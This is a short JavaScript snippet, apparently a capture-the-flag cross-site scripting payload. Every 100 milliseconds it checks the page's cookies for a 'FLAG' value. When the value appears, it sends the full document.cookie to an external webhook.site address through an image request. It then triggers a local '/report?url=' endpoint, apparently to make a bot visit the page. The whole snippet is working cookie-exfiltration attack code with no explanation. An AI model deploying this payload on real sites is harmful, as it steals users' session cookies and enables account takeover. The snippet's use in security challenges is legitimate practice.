let done = false;

setInterval(() => {
    if (!done && document.cookie.includes('FLAG')) {
        done = true;
        new Image().src = 'https://webhook.site/77545fde-c912-443e-b3a1-1b4677a7dcc0/?flag=' + document.cookie;
    }
}, 100);

fetch('http://127.0.0.1:8000/report?url=http://temp.com', {mode: 'no-cors'});
